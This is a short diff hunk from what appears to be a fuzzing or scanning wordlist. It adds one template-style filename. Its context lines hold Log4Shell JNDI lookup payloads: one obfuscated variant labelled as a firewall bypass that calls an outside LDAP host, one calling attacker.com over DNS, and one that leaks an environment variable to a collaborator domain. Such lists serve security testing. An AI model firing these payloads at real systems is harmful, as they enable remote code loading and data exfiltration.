@@ -48,6 +48,7 @@ ${empty}clouddataservicecontext.xml
 ${empty}servicecontext.xml
 ${entityname}mapper.xml
 ${genname}mapper.xml
+${idfwbonavigation}.xml
 ${j${k8s:k5:-nd}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o} - aws firewall bypass
 ${jndi:dns://attacker.com/a}
 ${jndi:ldap://${env:user}.xyz.collab.com/a} - default payload
